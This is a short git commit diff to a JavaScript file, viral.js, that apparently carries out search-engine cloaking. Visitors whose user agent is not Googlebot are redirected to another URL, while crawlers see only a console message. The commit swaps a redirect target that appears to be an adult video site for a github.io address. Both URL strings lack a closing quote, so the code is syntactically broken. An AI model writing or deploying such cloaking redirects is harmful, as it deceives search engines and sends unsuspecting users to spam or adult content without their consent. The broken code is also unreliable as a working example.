c6591444673adadef6213a89decb1849fde081bf
owlhive <antorkaka15@gmail.com>
2026-08-29 14:04:39 +0600

    Update viral.js

--- viral.js
+++ viral.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://xvideoindo.com/vod/;
+  window.location.href = "https://owlhive.github.io/vid/viral.js;
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
